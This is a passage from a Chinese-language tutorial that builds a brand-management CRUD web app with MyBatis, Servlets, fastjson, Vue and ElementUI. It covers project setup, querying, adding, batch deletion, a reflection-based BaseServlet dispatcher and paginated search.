&#x27;搜搜搜&#x27;, 0), (&#x27;京东&#x27;, &#x27;北京京东世纪贸易有限公司&#x27;, 40, &#x27;就是快&#x27;, 1), (&#x27;华为&#x27;, &#x27;华为技术有限公司&#x27;, 100, &#x27;万物互联&#x27;, 1), (&#x27;小米&#x27;, &#x27;小米科技有限公司&#x27;, 50, &#x27;are you ok&#x27;, 1), (&#x27;格力&#x27;, &#x27;格力电器股份有限公司&#x27;, 30, &#x27;让世界爱上中国造&#x27;, 1), (&#x27;阿里巴巴&#x27;, &#x27;阿里巴巴集团控股有限公司&#x27;, 10, &#x27;买买买&#x27;, 1), (&#x27;腾讯&#x27;, &#x27;腾讯计算机系统有限公司&#x27;, 50, &#x27;玩玩玩&#x27;, 0), (&#x27;百度&#x27;, &#x27;百度在线网络技术公司&#x27;, 5, &#x27;搜搜搜&#x27;, 0), (&#x27;京东&#x27;, &#x27;北京京东世纪贸易有限公司&#x27;, 40, &#x27;就是快&#x27;, 1), (&#x27;小米&#x27;, &#x27;小米科技有限公司&#x27;, 50, &#x27;are you ok&#x27;, 1), (&#x27;三只松鼠&#x27;, &#x27;三只松鼠股份有限公司&#x27;, 5, &#x27;好吃不上火&#x27;, 0), (&#x27;华为&#x27;, &#x27;华为技术有限公司&#x27;, 100, &#x27;万物互联&#x27;, 1), (&#x27;小米&#x27;, &#x27;小米科技有限公司&#x27;, 50, &#x27;are you ok&#x27;, 1), (&#x27;格力&#x27;, &#x27;格力电器股份有限公司&#x27;, 30, &#x27;让世界爱上中国造&#x27;, 1), (&#x27;阿里巴巴&#x27;, &#x27;阿里巴巴集团控股有限公司&#x27;, 10, &#x27;买买买&#x27;, 1), (&#x27;腾讯&#x27;, &#x27;腾讯计算机系统有限公司&#x27;, 50, &#x27;玩玩玩&#x27;, 0), (&#x27;百度&#x27;, &#x27;百度在线网络技术公司&#x27;, 5, &#x27;搜搜搜&#x27;, 0), (&#x27;京东&#x27;, &#x27;北京京东世纪贸易有限公司&#x27;, 40, &#x27;就是快&#x27;, 1), (&#x27;华为&#x27;, &#x27;华为技术有限公司&#x27;, 100, &#x27;万物互联&#x27;, 1), (&#x27;小米&#x27;, &#x27;小米科技有限公司&#x27;, 50, &#x27;are you ok&#x27;, 1), (&#x27;格力&#x27;, &#x27;格力电器股份有限公司&#x27;, 30, &#x27;让世界爱上中国造&#x27;, 1), (&#x27;阿里巴巴&#x27;, &#x27;阿里巴巴集团控股有限公司&#x27;, 10, &#x27;买买买&#x27;, 1), (&#x27;腾讯&#x27;, &#x27;腾讯计算机系统有限公司&#x27;, 50, &#x27;玩玩玩&#x27;, 0), (&#x27;百度&#x27;, &#x27;百度在线网络技术公司&#x27;, 5, &#x27;搜搜搜&#x27;, 0), (&#x27;京东&#x27;, &#x27;北京京东世纪贸易有限公司&#x27;, 40, &#x27;就是快&#x27;, 1), (&#x27;小米&#x27;, &#x27;小米科技有限公司&#x27;, 50, &#x27;are you ok&#x27;, 1), (&#x27;三只松鼠&#x27;, &#x27;三只松鼠股份有限公司&#x27;, 5, &#x27;好吃不上火&#x27;, 0), (&#x27;华为&#x27;, &#x27;华为技术有限公司&#x27;, 100, &#x27;万物互联&#x27;, 1), (&#x27;小米&#x27;, &#x27;小米科技有限公司&#x27;, 50, &#x27;are you ok&#x27;, 1), (&#x27;格力&#x27;, &#x27;格力电器股份有限公司&#x27;, 30, &#x27;让世界爱上中国造&#x27;, 1), (&#x27;阿里巴巴&#x27;, &#x27;阿里巴巴集团控股有限公司&#x27;, 10, &#x27;买买买&#x27;, 1), (&#x27;腾讯&#x27;, &#x27;腾讯计算机系统有限公司&#x27;, 50, &#x27;玩玩玩&#x27;, 0), (&#x27;百度&#x27;, &#x27;百度在线网络技术公司&#x27;, 5, &#x27;搜搜搜&#x27;, 0), (&#x27;京东&#x27;, &#x27;北京京东世纪贸易有限公司&#x27;, 40, &#x27;就是快&#x27;, 1); 2.3 配置信息mybatis将mybatis的配置文件mybatis-config.xmlcopy到src/main/resource目录下 &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt; &lt;!DOCTYPE configuration PUBLIC &quot;-//mybatis.org//DTD Config 3.0//EN&quot; &quot;http://mybatis.org/dtd/mybatis-3-config.dtd&quot;&gt; &lt;configuration&gt; &lt;typeAliases&gt; &lt;package name=&quot;com.itheima.pojo&quot;/&gt; &lt;/typeAliases&gt; &lt;environments default=&quot;development&quot;&gt; &lt;environment id=&quot;development&quot;&gt; &lt;transactionManager type=&quot;JDBC&quot;/&gt; &lt;dataSource type=&quot;POOLED&quot;&gt; &lt;property name=&quot;driver&quot; value=&quot;com.mysql.jdbc.Driver&quot;/&gt; &lt;!-- 配置数据名 javastudy 用户名和密码--&gt; &lt;property name=&quot;url&quot; value=&quot;jdbc:mysql:///javastudy?useSSL=false&quot;/&gt; &lt;property name=&quot;username&quot; value=&quot;root&quot;/&gt; &lt;property name=&quot;password&quot; value=&quot;root&quot;/&gt; &lt;/dataSource&gt; &lt;/environment&gt; &lt;/environments&gt; &lt;mappers&gt; &lt;!--扫描mapper 这里根据项目的mapper目录配置--&gt; &lt;package name=&quot;com.itheima.mapper&quot;/&gt; &lt;/mappers&gt; &lt;/configuration&gt; mavenpom.xml &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;groupId&gt;org.example&lt;/groupId&gt; &lt;artifactId&gt;brand-case&lt;/artifactId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt; &lt;!--web项目将打包成war格式 普通项目则为jar --&gt; &lt;packaging&gt;war&lt;/packaging&gt; &lt;properties&gt; &lt;maven.compiler.source&gt;8&lt;/maven.compiler.source&gt; &lt;maven.compiler.target&gt;8&lt;/maven.compiler.target&gt; &lt;/properties&gt; &lt;dependencies&gt; &lt;!--Servlet--&gt; &lt;dependency&gt; &lt;groupId&gt;javax.servlet&lt;/groupId&gt; &lt;artifactId&gt;javax.servlet-api&lt;/artifactId&gt; &lt;version&gt;3.1.0&lt;/version&gt; &lt;scope&gt;provided&lt;/scope&gt; &lt;/dependency&gt; &lt;!--MyBatis依赖--&gt; &lt;dependency&gt; &lt;groupId&gt;org.mybatis&lt;/groupId&gt; &lt;artifactId&gt;mybatis&lt;/artifactId&gt; &lt;version&gt;3.5.5&lt;/version&gt; &lt;/dependency&gt; &lt;!--MySQL--&gt; &lt;dependency&gt; &lt;groupId&gt;mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt; &lt;version&gt;5.1.34&lt;/version&gt; &lt;/dependency&gt; &lt;!--fastjson json转object时用到--&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;fastjson&lt;/artifactId&gt; &lt;version&gt;1.2.62&lt;/version&gt; &lt;/dependency&gt; &lt;/dependencies&gt; &lt;build&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;org.apache.tomcat.maven&lt;/groupId&gt; &lt;artifactId&gt;tomcat7-maven-plugin&lt;/artifactId&gt; &lt;version&gt;2.2&lt;/version&gt; &lt;!-- 这里可以配置tomcat的port和根路径 --&gt; &lt;/plugin&gt; &lt;/plugins&gt; &lt;/build&gt; &lt;/project&gt; 包在/scr/main/java中新建pojo、mapper、service、web、util等包 包名 作用 pojo 存放实体类，比如Brand、User等 mapper 存放对应的Mapper接口 比如BrandMapper service 存放提供服务的类BrandService web 存放web层使用到的Servlet util 存放工具包 创建src/main/resources/com/itheima/mapper/目录，该目录存放BrandMapper.xml 该文件在tomcat启动后自动保存到src/main/java/com/itheima/mapper/BrandMapper.xml 前端页面登录和注册页面使用html和javascript设计 展示页面使用Vue和element-ui设计出一个简单的展示页面 功能实现1.查询所有需求分析 当页面加载完成后，数据需要展示到出来，所以需要在Vue中mounted构造函数中写发送异步请求的代码 并且发送请求时无需携带参数 服务器返回所有数据，其格式为json格式，返回的参数绑定到vue的模型中，显示到页面中 后端实现dao在com.itheima.mapper.BrandMapper接口中添加selectAll()方法 /** * 查询所有 * @return */ @Select(&quot;select * from tb_brand&quot;) @ResultMap(&quot;brandResultMap&quot;) List&lt;Brand&gt; selectAll(); 由于表中有些字段名和实体类中的属性名没有对应，所以需要在 com/itheima/mapper/BrandMapper.xml 映射配置文件中定义结果映射 ，使用resultMap 标签。映射配置文件内容如下： &lt;resultMap id=&quot;brandResultMap&quot; type=&quot;brand&quot;&gt; &lt;result property=&quot;brandName&quot; column=&quot;brand_name&quot;/&gt; &lt;result property=&quot;companyName&quot; column=&quot;company_name&quot;/&gt; &lt;/resultMap&gt; service在com.itheima.mapper中创建BrandService类 // 获取sqlSessionFactory // 该类 存放在util包中，封装后方便使用 SqlSessionFactory sqlSessionFactory = SqlSessionFactoryUtils.getSqlSessionFactory(); /** * 查询所有 * @return */ public List&lt;Brand&gt; selectAll()&#123; SqlSession sqlSession = sqlSessionFactory.openSession(); // 获取 BrandMapper BrandMapper mapper = sqlSession.getMapper(BrandMapper.class); // 调用方法 List&lt;Brand&gt; brands = mapper.selectAll(); sqlSession.close(); // 返回查询到的数据 return brands; &#125; servlet在com.itheima.web中创建SelectAllServlet可以使用Idea提供的模板创建自动继承HttpServlet package com.itheima.web.servlet; import com.alibaba.fastjson.JSON; import com.itheima.pojo.Brand; import com.itheima.service.BrandService; import jdk.nashorn.internal.ir.CallNode; import javax.servlet.*; import javax.servlet.http.*; import javax.servlet.annotation.*; import java.io.IOException; import java.util.List; @WebServlet(value = &quot;/selectAllServlet&quot;) public class SelectAllServlet extends HttpServlet &#123; // 创建BrandService private BrandService service = new BrandService(); @Override protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123; // 调用BrandService中的selectAll方法 List&lt;Brand&gt; brandList = service.selectAll(); // 将brand对象转换为json字符串 String string = JSON.toJSONString(brandList); // 设置响应数据类型为json response.setContentType(&quot;text/json;charset=utf-8&quot;); //响应数据 response.getWriter().write(string); &#125; @Override protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123; doGet(request, response); &#125; &#125; 前端实现前端需要在页面加载完毕后发送 ajax 请求，所以发送请求的逻辑应该放在 mounted() 钩子函数中。而响应回来的数据需要赋值给表格绑定的数据模型，从代码中可以看出表格绑定的数据模型是 brandlist &lt;!--表格--&gt; &lt;template&gt; &lt;el-table :data=&quot;brandlist&quot; style=&quot;width: 100%&quot; :row-class-name=&quot;tableRowClassName&quot; @selection-change=&quot;handleSelectionChange&quot; &gt; ajax请求为 methods:&#123; selectAll()&#123; var _this = this; axios(&#123; method: &#x27;GET&#x27;, url: &#x27;http://localhost:8080/brand-case/brand/selectAll&#x27; &#125;).then(function(response)&#123; var brandlist = response.data; _this.brandlist = brandlist; &#125;) &#125; &#125; mounted()&#123; this.selectAll; &#125; 2.添加功能需求分析 用户请求后台时需要携带数据，且为post请求，携带的数据类型为json类型 后端服务器获取json数据后将其转换为Brand类型 添加成功后响应前端 后端实现dao在BrandMapper中添加addBrand()方法 /** * 添加 * @param brand */ @Insert(&quot;insert into tb_brand values (null, #&#123;brandName&#125;, #&#123;companyName&#125;, #&#123;ordered&#125;,#&#123;description&#125;, #&#123;status&#125;)&quot;) void addBrand(Brand brand); service在BrandService中实现addBrand()业务逻辑方法 /** * 添加 * @param brand */ public void addBrand(Brand brand)&#123; SqlSession sqlSession = sqlSessionFactory.openSession(); BrandMapper mapper = sqlSession.getMapper(BrandMapper.class); mapper.addBrand(brand); // 对数据库的增删改 记得提交事务 sqlSession.commit(); sqlSession.close(); &#125; servlet前端请求时携带json数据，request.getParamter()无法获取，需要使用获取请求体的方法request.getReader() package com.itheima.web.servlet; import com.alibaba.fastjson.JSON; import com.itheima.pojo.Brand; import com.itheima.service.BrandService; import javax.servlet.ServletException; import javax.servlet.annotation.WebServlet; import javax.servlet.http.HttpServlet; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import java.io.BufferedReader; import java.io.IOException; import java.util.List; @WebServlet(value = &quot;/addServlet&quot;) public class AddServlet extends HttpServlet &#123; private BrandService service = new BrandService(); @Override protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123; // getParamter无法获取json数据 BufferedReader reader = request.getReader(); String line = reader.readLine(); System.out.println(line); // 将json数据转换为Brand对象 Brand brand = JSON.parseObject(line, Brand.class); System.out.println(brand); service.addBrand(brand); // 返回的响应数据 response.getWriter().write(&quot;success&quot;); &#125; @Override protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123; doGet(request, response); &#125; &#125; 前端实现添加的对话框 初始时该对话框为隐藏状态，其状态有dialogVisible控制，默认情况下为false &lt;el-dialog title=&quot;添加品牌&quot; :visible.sync=&quot;dialogVisible&quot; width=&quot;30%&quot; &gt; 当点击添加按钮时，将dialogVisible设置为true，对话框弹出，便可以编辑数据 &lt;el-button type=&quot;primary&quot; plain @click=&quot;dialogVisible = true&quot;&gt;新增&lt;/el-button&gt; 提交数据对话框实际上是一个form表单，该表单数据与brand模型绑定，所以请求后端时提交brand即可 new Vue(&#123; data()&#123; return &#123; // 品牌模型数据 brand: &#123; status: &#x27;&#x27;, brandName: &#x27;&#x27;, companyName: &#x27;&#x27;, id:&quot;&quot;, ordered:&quot;&quot;, description:&quot;&quot; &#125;, &#125; &#125; &#125;) 提交和取消按钮 &lt;el-button type=&quot;primary&quot; @click=&quot;addBrand&quot;&gt;提交&lt;/el-button&gt; &lt;!--取消 只需要将dialogVisble设置为false即可隐藏对话框--&gt; &lt;el-button @click=&quot;dialogVisible = false&quot;&gt;取消&lt;/el-button&gt; addBrand // 添加数据 addBrand()&#123; var _this = this; this.currentPage=1 axios(&#123; method: &#x27;post&#x27;, url: &#x27;http://localhost:8080/brand-case/brand/add&#x27;, data: brand = _this.brand &#125;).then(function(response)&#123; if(response.data == &quot;success&quot;)&#123; // 隐藏对话框 _this.dialogVisible = false; // 重新加载全部数据 _this.selectAll(); _this.msgbox(&quot;添加成功！&quot;); &#125; &#125;) &#125; Servlet优化===Web 层的 Servlet 个数太多了，不利于管理和编写=== 通过之前的两个功能，我们发现每一个功能都需要定义一个 servlet，一个模块需要实现增删改查功能，就需要4个 servlet，模块一多就会造成servlet 泛滥。此时我们就想 servlet 能不能像 service 一样，一个模块只定义一个 servlet，而每一个功能只需要在该 servlet 中定义对应的方法。例如下面代码： @WebServlet(&quot;/brand/*&quot;) public class BrandServlet &#123; //查询所有 public void selectAll(...) &#123;&#125; //添加数据 public void add(...) &#123;&#125; //修改数据 public void update(...) &#123;&#125; //删除删除 public void delete(...) &#123;&#125; &#125; 而我们知道发送请求 servlet，tomcat 会自动的调用 service() 方法，之前我们在自定义的 servlet 中重写 doGet() 方法和 doPost() 方法，当我们访问该 servlet 时会根据请求方式将请求分发给 doGet() 或者 doPost() 方法 那么我们也可以仿照这样请求分发的思想，在 service() 方法中根据具体的操作调用对应的方法，如：查询所有就调用 selectAll() 方法，添加企业信息就调用 add() 方法。 为了做到通用，我们定义一个通用的 servlet 类，在定义其他的 servlet 是不需要继承 HttpServlet，而继承我们定义的 BaseServlet，在BaseServlet 中调用具体 servlet（如BrandServlet）中的对应方法。 public class BaseServlet extends HttpServlet &#123; @Override protected void service(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123; //进行请求的分发 &#125; &#125; BrandServlet 定义就需要修改为如下： @WebServlet(&quot;/brand/*&quot;) public class BrandServlet extends BaseServlet &#123; //用户实现分页查询 public void selectAll(...) &#123;&#125; //添加企业信息 public void add(...) &#123;&#125; //修改企业信息 public void update(...) &#123;&#125; //删除企业信息 public void delete(...) &#123;&#125; &#125; 那么如何在 BaseServlet 中调用对应的方法呢？比如查询所有就调用 selectAll() 方法。 可以==规定在发送请求时，请求资源的二级路径（/brandServlet/selectAll）和需要调用的方法名相同==，如： 查询所有数据的路径以后就需要写成： http://localhost:8080/brand-case/brandServlet/selectAll 添加数据的路径以后就需要写成： http://localhost:8080/brand-case/brandServlet/add 修改数据的路径以后就需要写成： http://localhost:8080/brand-case/brandServlet/update 删除数据的路径以后就需要写成： http://localhost:8080/brand-case/brandServlet/delete 这样的话，在 BaseServlet 中就需要获取到资源的二级路径作为方法名，然后调用该方法 public class BaseServlet extends HttpServlet &#123; @Override protected void service(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123; //1. 获取请求路径 String uri = req.getRequestURI(); // 例如路径为：/brand-case/brand/selectAll //2. 获取最后一段路径，方法名 int index = uri.lastIndexOf(&#x27;/&#x27;); String methodName = uri.substring(index + 1); // 获取到资源的二级路径 selectAll //2. 执行方法 //2.1 获取BrandServlet /UserServlet 字节码对象 Class //System.out.println(this); Class&lt;? extends BaseServlet&gt; cls = this.getClass(); //2.2 获取方法 Method对象 try &#123; Method method = cls.getMethod(methodName,？？？); //4,调用该方法 method.invoke(this,？？？); &#125; catch (NoSuchMethodException e) &#123; e.printStackTrace(); &#125; catch (IllegalAccessException e) &#123; e.printStackTrace(); &#125; catch (InvocationTargetException e) &#123; e.printStackTrace(); &#125; &#125; &#125; 通过上面代码发现根据方法名获取对应方法的 Method 对象时需要指定方法参数的字节码对象。解决这个问题，可以将方法的参数类型规定死，而方法中可能需要用到 request 对象和 response 对象，所以指定方法的参数为 HttpServletRequest 和 HttpServletResponse，那么 BrandServlet 代码就可以改进为： @WebServlet(&quot;/brand/*&quot;) public class BrandServlet extends BaseServlet &#123; //用户实现分页查询 public void selectAll(HttpServletRequest req, HttpServletResponse resp) &#123;&#125; //添加企业信息 public void add(HttpServletRequest req, HttpServletResponse resp) &#123;&#125; //修改企业信息 public void update(HttpServletRequest req, HttpServletResponse resp) &#123;&#125; //删除企业信息 public void delete(HttpServletRequest req, HttpServletResponse resp) &#123;&#125; &#125; BaseServlet代码可以改进为： public class BaseServlet extends HttpServlet &#123; //根据请求的最后一段路径来进行方法分发 @Override protected void service(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123; //1. 获取请求路径 String uri = req.getRequestURI(); // 例如路径为：/brand-case/brand/selectAll //2. 获取最后一段路径，方法名 int index = uri.lastIndexOf(&#x27;/&#x27;); String methodName = uri.substring(index + 1); // 获取到资源的二级路径 selectAll //2. 执行方法 //2.1 获取BrandServlet /UserServlet 字节码对象 Class //System.out.println(this); Class&lt;? extends BaseServlet&gt; cls = this.getClass(); //2.2 获取方法 Method对象 try &#123; Method method = cls.getMethod(methodName, HttpServletRequest.class, HttpServletResponse.class); //2.3 执行方法 method.invoke(this,req,resp); &#125; catch (NoSuchMethodException e) &#123; e.printStackTrace(); &#125; catch (IllegalAccessException e) &#123; e.printStackTrace(); &#125; catch (InvocationTargetException e) &#123; e.printStackTrace(); &#125; &#125; &#125; 前端需要改只有几个访问路径，这里不做具体实现 3.批量删除需求分析 批量删除请求，携带参数为[1,2,3...]类型的json字符串 后端接收到json字符串后需要将其转为int数组 调用BrandService中的方法删除数据 后端实现daoBrandMapper中添加deleteByIds()方法 /** * 批量删除 * @param ids */ void deleteByIds(@Param(&quot;ids&quot;) int[] ids); service在BrandService中实现批量删除的业务逻辑代码 /** * 批量删除 * @param ids */ public void deleteByIds(int[] ids)&#123; SqlSession sqlSession = sqlSessionFactory.openSession(); BrandMapper mapper = sqlSession.getMapper(BrandMapper.class); mapper.deleteByIds(ids); sqlSession.commit(); sqlSession.close(); &#125; servletsrc/main/java/com/itheima/web/servlet的BrandServlet添加deleteByIds方法 /** * 批量删除操作 * @param request * @param response * @throws ServletException * @throws IOException */ public void deleteByIds(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123; BufferedReader reader = request.getReader(); // 获取json字符串 String line = reader.readLine(); System.out.println(line); int[] ids = JSON.parseObject(line, int[].class); System.out.println(ids); service.deleteByIds(ids); response.getWriter().write(&quot;success&quot;); &#125; 前端实现获取选中数据的id值handleSelectionChange &lt;el-table :data=&quot;brandlist&quot; style=&quot;width: 100%&quot; :row-class-name=&quot;tableRowClassName&quot; @selection-change=&quot;handleSelectionChange&quot; &gt; 可以看到当数据被选中后，multipleSelection会存放被选择的数据对象 // 复选框选中后执行的方法 handleSelectionChange(val) &#123; this.multipleSelection = val; console.log(this.multipleSelection) // console.log(this.multipleSelection) &#125;, 而我们所需要的只是对象的id值，因此需要遍历multipleSelection获取id值 // 从_this.multipleSelection获取brand的id值 for(let i=0; i&lt;_this.multipleSelection.length;i++)&#123; let selectItem = _this.multipleSelection[i]; _this.selectedIds[i] = selectItem.id; &#125; 批量删除提示删除操作一般比较危险因此需要让用户确认是否删除，在element-ui中找到$confirm组件实现该功能 deleteByIds()&#123; this.$confirm(&#x27;确定删除吗？&#x27;, &#x27;确认信息&#x27;, &#123; distinguishCancelAndClose: true, confirmButtonText: &#x27;确定&#x27;, cancelButtonText: &#x27;取消&#x27; &#125;).then(() =&gt; &#123; var _this = this; // 从_this.multipleSelection获取brand的id值 for(let i=0; i&lt;_this.multipleSelection.length;i++)&#123; let selectItem = _this.multipleSelection[i]; _this.selectedIds[i] = selectItem.id; &#125; axios(&#123; method: &#x27;post&#x27;, url:&quot;http://localhost:8080/brand-case/brand/deleteByIds&quot;, data: _this.selectedIds &#125;).then(function(response)&#123; if(response.data == &quot;success&quot;)&#123; // 重新查询数据 _this.selectAll(); //显示提示框 _this.$message(&#123; type: &#x27;success&#x27;, message: &#x27;删除成功&#x27; &#125;); &#125; &#125;) &#125;).catch(() =&gt; &#123; this.$message(&#123; type: &#x27;info&#x27;, message: &quot;取消删除&quot; &#125;) &#125;); &#125; 4.分页查询需求分析分页查询sql分页查询也是从数据库进行查询的，所以我们要分页对应的SQL语句应该怎么写。分页查询使用 LIMIT 关键字，格式为：==LIMIT 开始索引 每页显示的条数==。以后前端页面在发送请求携带参数时，它并不明确开始索引是什么，但是它知道查询第几页。所以 开始索引 需要在后端进行计算，计算的公式是 ：==开始索引 = （当前页码 - 1）* 每页显示条数== 比如查询第一页的数据的 SQL 语句是： select * from tb_brand limit 0,5; 查询第二页的数据的 SQL 语句是： select * from tb_brand limit 5,5; 查询第三页的数据的 SQL 语句是： select * from tb_brand limit 10,5; 前后端数据分析分页查询功能时候比较复杂的，所以我们要先分析清楚以下两个问题： 前端需要传递什么参数给后端 根据上一步对分页查询 SQL 语句分析得出，前端需要给后端两个参数 当前页码 ： currentPage 每页显示条数：pageSize 后端需要响应什么数据给前端 上图是分页查询页面展示的效果，从上面我们可以看出需要响应以下联股份数据 当前页需要展示的数据。我们在后端一般会存储到 List 集合中 总共记录数。在上图页面中需要展示总的记录数，所以这部分数据也需要。总的页面 elementUI 的分页组件会自动计算，我们不需要关心 而这两部分需要封装到 PageBean 对象中，并将该对象转换为 json 格式的数据响应回给浏览器 通过上面的分析我们需要先在 pojo 包下创建 PageBean 类，为了做到通过会将其定义成泛型类，代码如下： //分页查询的JavaBean public class PageBean&lt;T&gt; &#123; // 总记录数 private int totalCount; // 当前页数据 private List&lt;T&gt; rows; public int getTotalCount() &#123; return totalCount; &#125; public void setTotalCount(int totalCount) &#123; this.totalCount = totalCount; &#125; public List&lt;T&gt; getRows() &#123; return rows; &#125; public void setRows(List&lt;T&gt; rows) &#123; this.rows = rows; &#125; &#125; 后端实现dao/** * 分页查询 * @param begin * @param size * @return */ @Select(&quot;select * from tb_brand limit #&#123;begin&#125;, #&#123;size&#125;&quot;) @ResultMap(&quot;brandResultMap&quot;) List&lt;Brand&gt; selectByPage(@Param(&quot;begin&quot;) int begin, @Param(&quot;size&quot;) int size); /** * 查询总记录数 * @return */ @Select(&quot;select count(*) from tb_brand&quot;) int selectTotalCount(); service /** * 分页查询 * @param currentPage * @param pageSize * @return */ public PageBean&lt;Brand&gt; selectByPage(int currentPage, int pageSize)&#123; SqlSession sqlSession = sqlSessionFactory.openSession(); BrandMapper mapper = sqlSession.getMapper(BrandMapper.class); // 根据公式计算起始值 int begin = (currentPage - 1) * pageSize; int size = pageSize; // 获取该页数据 List&lt;Brand&gt; rows = mapper.selectByPage(begin, size); // 获取总记录数 int totalCount = mapper.selectTotalCount(); // 创建PageBean对象 PageBean&lt;Brand&gt; pageBean = new PageBean&lt;&gt;(); pageBean.setRows(rows); pageBean.setTotalCount(totalCount); sqlSession.close(); return pageBean; &#125; servlet /** * 分页查询 * @param request * @param response * @throws ServletException * @throws IOException */ public void selectByPage(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123; request.setCharacterEncoding(&quot;utf-8&quot;); // 1.获取当前页码和每页展示条数 url?currentpage=1&amp;pagesize=5 String _currentpage = request.getParameter(&quot;currentpage&quot;); String _pagesize = request.getParameter(&quot;pagesize&quot;); int currentpage = Integer.parseInt(_currentpage); int pagesize = Integer.parseInt(_pagesize); // 2.转为json PageBean&lt;Brand&gt; pageBean = service.selectByPage(currentpage, pagesize); String string = JSON.toJSONString(pageBean); // 响应数据 response.setContentType(&quot;text/json;charset=utf-8&quot;); response.getWriter().write(string); &#125; 前端实现分页工具条放在表单下面 &lt;!--分页工具条--&gt; &lt;el-pagination @size-change=&quot;handleSizeChange&quot; &lt;!--设置每页显示条数--&gt; @current-change=&quot;handleCurrentChange&quot; &lt;!--修改当前页码--&gt; :current-page=&quot;currentPage&quot; &lt;!--绑定currentPage模型--&gt; :page-sizes=&quot;[5, 10, 15, 20]&quot; :page-size=&quot;5&quot; layout=&quot;total, sizes, prev, pager, next, jumper&quot; :total=&quot;totalCount&quot;&gt; &lt;!--绑定totalCount模型--&gt; &lt;/el-pagination&gt; 修改handleSizeChange和handleCurrentChange handleSizeChange(val) &#123; // console.log(`每页 $&#123;val&#125; 条`); // 设置每页显示条数 this.pageSize = val; // 重新查询 this.selectAll(); // this.currentPage=1 &#125;, handleCurrentChange(val) &#123; this.currentPage = val; &#125;, 修改selectAll()异步请求方法主要修改url和获取响应数据后的处理方式 selectAll()&#123; // var _this = this; // axios(&#123; // method: &#x27;GET&#x27;, // url: &#x27;http://localhost:8080/brand-case/brand/selectAll&#x27; // &#125;).then(function(response)&#123; // var brandlist = response.data; // _this.brandlist = brandlist; // &#125;) var _this = this; axios(&#123; method: &#x27;GET&#x27;, url: &#x27;http://localhost:8080/brand-case/brand/selectByPage?currentpage=&#x27;+ _this.currentPage + &#x27;&amp;pagesize=&#x27; + _this.pageSize &#125;).then(function(response)&#123; // 获取数据 &#123;rows: &#123; &#125;,totalCount:47&#125; var brandlist = response.data.rows; // 设置表格数据 _this.brandlist = brandlist; // 设置总记录数 _this.totalCount = response.data.totalCount; &#125;) &#125;, 5.多条件分页查询需求分析 用户提交数据 状态 品牌名称 企业名称， 绑定到brand模型后作为参数提交为后端 三个条件的查询为and关系，并且对品牌和企业的查询需要使用模糊查询即需要like关键字 查询后依然需要分页显示，因此需要返回符合条件的数据外，还要返回对应的数量 可以根据分页查询修改代码 后端实现dao需要两个查询，selelctByConditions和selectByConditionsCount /** * 多条件查询 * @param brand * @param begin * @param size * @return */ List&lt;Brand&gt; selectByConditions(@Param(&quot;brand&quot;) Brand brand, @Param(&quot;begin&quot;) int begin, @Param(&quot;size&quot;) int size); /** * 多条件查询的记录条数 * @param brand * @return */ int selectByConditionsCount(Brand brand); 在对应的BrandMapper.xml中实现具体的查询 &lt;select id=&quot;selectByConditions&quot; resultType=&quot;com.itheima.pojo.Brand&quot; resultMap=&quot;brandResultMap&quot;&gt; select * from tb_brand &lt;where&gt; &lt;!--这里有多个参数，访问brand数据实时需要使用brand.brandName--&gt; &lt;if test=&quot;brand.brandName != null and brand.brandName != &#x27;&#x27;&quot;&gt; and brand_name like #&#123;brand.brandName&#125; &lt;/if&gt; &lt;if test=&quot;brand.companyName != null and brand.companyName != &#x27;&#x27;&quot;&gt; and company_name like #&#123;brand.companyName&#125; &lt;/if&gt; &lt;if test=&quot;brand.status != null&quot;&gt; and status = #&#123;brand.status&#125; &lt;/if&gt; &lt;/where&gt; limit #&#123;begin&#125;, #&#123;size&#125; &lt;/select&gt; &lt;select id=&quot;selectByConditionsCount&quot; resultType=&quot;java.lang.Integer&quot;&gt; select count(*) from tb_brand &lt;where&gt; &lt;!--这里为单个参数，访问brand数据实时需要使用#&#123;brandName&#125;--&gt; &lt;if test=&quot;brandName != null and brandName != &#x27;&#x27;&quot;&gt; and brand_name like #&#123;brandName&#125; &lt;/if&gt; &lt;if test=&quot;companyName != null and companyName != &#x27;&#x27;&quot;&gt; and company_name like #&#123;companyName&#125; &lt;/if&gt; &lt;if test=&quot;status != null&quot;&gt; and status = #&#123;status&#125; &lt;/if&gt; &lt;/where&gt; &lt;/select&gt; service在BrandService中实现多条件分页查询的业务逻辑 /** * 多条件分页查询 * @param currentPage * @param pageSize * @return */ public PageBean&lt;Brand&gt; selectByConditionsPage(Brand brand, int currentPage, int pageSize)&#123; SqlSession sqlSession = sqlSessionFactory.openSession(); BrandMapper mapper = sqlSession.getMapper(BrandMapper.class); int begin = (currentPage - 1) * pageSize; int size = pageSize; // 对数据进行处理加上 % 模糊查询表达式 if(brand.getBrandName() != null &amp;&amp; brand.getBrandName().length() &gt; 0 )&#123; brand.setBrandName(&quot;%&quot; + brand.getBrandName() + &quot;%&quot;); &#125; if(brand.getCompanyName() != null &amp;&amp; brand.getCompanyName().length() &gt; 0)&#123; brand.setCompanyName(&quot;%&quot; + brand.getCompanyName() + &quot;%&quot;); &#125; System.out.println(brand); List&lt;Brand&gt; rows = mapper.selectByConditions(brand, begin, size); int totalCount = 